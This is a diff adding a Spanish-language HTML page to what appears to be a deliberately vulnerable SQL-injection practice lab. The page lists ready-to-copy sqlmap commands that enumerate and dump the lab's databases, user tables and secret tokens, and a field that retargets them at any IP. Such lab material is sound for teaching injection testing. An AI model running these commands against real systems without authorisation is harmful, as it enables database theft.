@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>sqlmap — SQLi Lab</title>
+  <link rel="stylesheet" href="/style.css"/>
+</head>
+<body>
+<nav>
+  <a href="/" class="logo">🔓 SQLi Lab</a>
+  <a href="/pagina/login">Login</a>
+  <a href="/pagina/noticias">Noticias</a>
+  <a href="/pagina/productos">Productos</a>
+  <a href="/pagina/buscar">Buscar</a>
+  <a href="/pagina/perfil">Perfil</a>
+  <span class="badge-vuln">⚠ Entorno Vulnerable</span>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <h1>🤖 Comandos sqlmap</h1>
+    <p>Copia estos comandos en tu terminal de <strong>Linux</strong> para atacar cada vulnerabilidad automáticamente.</p>
+  </div>
+
+  <!-- IP Input -->
+  <div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-bottom:2rem;">
+    <label style="font-size:.85rem;color:var(--muted);display:block;margin-bottom:.5rem;">IP del servidor Windows (donde corre node app.js):</label>
+    <div style="display:flex;gap:.75rem;">
+      <input type="text" id="ipInput" value="192.168.1.17" style="flex:1;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:.7rem 1rem;border-radius:8px;font-size:.95rem;font-family:inherit;outline:none;"/>
+      <input type="text" id="portInput" value="3000" style="width:90px;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:.7rem 1rem;border-radius:8px;font-size:.95rem;font-family:inherit;outline:none;"/>
+      <button onclick="updateCommands()" style="background:var(--accent);color:white;border:none;padding:.7rem 1.4rem;border-radius:8px;font-weight:600;cursor:pointer;font-family:inherit;">Actualizar</button>
+    </div>
+    <p style="font-size:.8rem;color:var(--muted);margin-top:.5rem;">En Windows ejecuta <code>ipconfig</code> para ver tu IP. Deja <code>localhost</code> si atacas desde la misma máquina.</p>
+  </div>
+
+  <!-- Cards de comandos -->
+  <div style="display:flex;flex-direction:column;gap:1.5rem;">
+
+    <div class="card" style="border-radius:12px;">
+      <span class="tag">Authentication Bypass · POST /login</span>
+      <h3>🔑 Login — Enumerar base de datos</h3>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header" style="display:flex;justify-content:space-between;align-items:center;">
+          <span>Terminal Linux</span>
+          <button onclick="copy('cmd1')" style="background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;border-radius:5px;cursor:pointer;font-size:.75rem;">Copiar</button>
+        </div>
+        <pre id="cmd1">sqlmap -u "http://192.168.1.17:3000/login" \
+  --data="username=admin&password=test" \
+  --method=POST \
+  --dbms=mysql \
+  --level=3 \
+  --risk=2 \
+  --dbs \
+  --batch \
+  --banner</pre>
+      </div>
+    </div>
+
+    <div class="card" style="border-radius:12px;">
+      <span class="tag">UNION-based · GET /noticias</span>
+      <h3>📰 Noticias — Volcar tabla usuarios</h3>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header" style="display:flex;justify-content:space-between;align-items:center;">
+          <span>Terminal Linux</span>
+          <button onclick="copy('cmd2')" style="background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;border-radius:5px;cursor:pointer;font-size:.75rem;">Copiar</button>
+        </div>
+        <pre id="cmd2">sqlmap -u "http://192.168.1.17:3000/noticias?id=1" \
+  --dbms=mysql \
+  --technique=U \
+  --level=3 \
+  -D practica \
+  -T usuarios \
+  --dump \
+  --batch</pre>
+      </div>
+    </div>
+
+    <div class="card" style="border-radius:12px;">
+      <span class="tag">Error-based · GET /productos</span>
+      <h3>🛍️ Productos — Extraer datos via errores MySQL</h3>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header" style="display:flex;justify-content:space-between;align-items:center;">
+          <span>Terminal Linux</span>
+          <button onclick="copy('cmd3')" style="background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;border-radius:5px;cursor:pointer;font-size:.75rem;">Copiar</button>
+        </div>
+        <pre id="cmd3">sqlmap -u "http://192.168.1.17:3000/productos?categoria=electronica" \
+  --dbms=mysql \
+  --technique=E \
+  --level=3 \
+  --risk=3 \
+  -D practica \
+  -T perfiles \
+  --dump \
+  --batch</pre>
+      </div>
+    </div>
+
+    <div class="card" style="border-radius:12px;">
+      <span class="tag">Blind Boolean + Time-based · GET /buscar</span>
+      <h3>🔍 Buscar — Blind SQLi (sin output directo)</h3>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header" style="display:flex;justify-content:space-between;align-items:center;">
+          <span>Terminal Linux</span>
+          <button onclick="copy('cmd4')" style="background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;border-radius:5px;cursor:pointer;font-size:.75rem;">Copiar</button>
+        </div>
+        <pre id="cmd4">sqlmap -u "http://192.168.1.17:3000/buscar?q=laptop" \
+  --dbms=mysql \
+  --technique=BT \
+  --level=5 \
+  --risk=3 \
+  --time-sec=3 \
+  -D practica \
+  -T usuarios \
+  --dump \
+  --batch</pre>
+      </div>
+    </div>
+
+    <div class="card" style="border-radius:12px;">
+      <span class="tag">Data Exposure · GET /perfil</span>
+      <h3>👤 Perfil — Extraer tokens secretos</h3>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header" style="display:flex;justify-content:space-between;align-items:center;">
+          <span>Terminal Linux</span>
+          <button onclick="copy('cmd5')" style="background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;border-radius:5px;cursor:pointer;font-size:.75rem;">Copiar</button>
+        </div>
+        <pre id="cmd5">sqlmap -u "http://192.168.1.17:3000/perfil?user=admin" \
+  --dbms=mysql \
+  -D practica \
+  -T perfiles \
+  -C "nombre_completo,token_secreto" \
+  --dump \
+  --batch</pre>
+      </div>
+    </div>
+
+    <div class="card" style="border-radius:12px;border-color:rgba(230,57,70,.4);">
+      <span class="tag">Ataque completo</span>
+      <h3>💣 Dump completo de toda la base de datos</h3>
+      <div class="result-box" style="margin-top:1rem;">
+        <div class="result-header" style="display:flex;justify-content:space-between;align-items:center;">
+          <span>Terminal Linux</span>
+          <button onclick="copy('cmd6')" style="background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;border-radius:5px;cursor:pointer;font-size:.75rem;">Copiar</button>
+        </div>
+        <pre id="cmd6">sqlmap -u "http://192.168.1.17:3000/noticias?id=1" \
+  --dbms=mysql \
+  --technique=BEUST \
+  --level=5 \
+  --risk=3 \
+  --dump-all \
+  --exclude-sysdbs \
+  --batch \
+  --flush-session</pre>
+      </div>
+    </div>
+
+  </div><!-- end cards -->
+</div>
+
+<script>
+function updateCommands() {
+  const ip   = document.getElementById('ipInput').value.trim();
+  const port = document.getElementById('portInput').value.trim();
+  const base = `http://${ip}:${port}`;
+
+  const templates = {
+    cmd1: `sqlmap -u "${base}/login" \\\n  --data="username=admin&password=test" \\\n  --method=POST \\\n  --dbms=mysql \\\n  --level=3 \\\n  --risk=2 \\\n  --dbs \\\n  --batch \\\n  --banner`,
+    cmd2: `sqlmap -u "${base}/noticias?id=1" \\\n  --dbms=mysql \\\n  --technique=U \\\n  --level=3 \\\n  -D practica \\\n  -T usuarios \\\n  --dump \\\n  --batch`,
+    cmd3: `sqlmap -u "${base}/productos?categoria=electronica" \\\n  --dbms=mysql \\\n  --technique=E \\\n  --level=3 \\\n  --risk=3 \\\n  -D practica \\\n  -T perfiles \\\n  --dump \\\n  --batch`,
+    cmd4: `sqlmap -u "${base}/buscar?q=laptop" \\\n  --dbms=mysql \\\n  --technique=BT \\\n  --level=5 \\\n  --risk=3 \\\n  --time-sec=3 \\\n  -D practica \\\n  -T usuarios \\\n  --dump \\\n  --batch`,
+    cmd5: `sqlmap -u "${base}/perfil?user=admin" \\\n  --dbms=mysql \\\n  -D practica \\\n  -T perfiles \\\n  -C "nombre_completo,token_secreto" \\\n  --dump \\\n  --batch`,
+    cmd6: `sqlmap -u "${base}/noticias?id=1" \\\n  --dbms=mysql \\\n  --technique=BEUST \\\n  --level=5 \\\n  --risk=3 \\\n  --dump-all \\\n  --exclude-sysdbs \\\n  --batch \\\n  --flush-session`,
+  };
+
+  for (const [id, text] of Object.entries(templates)) {
+    document.getElementById(id).textContent = text;
+  }
+}
+
+function copy(id) {
+  const text = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    event.target.textContent = '¡Copiado!';
+    setTimeout(() => event.target.textContent = 'Copiar', 1500);
+  });
+}
+</script>
+</body>
+</html>
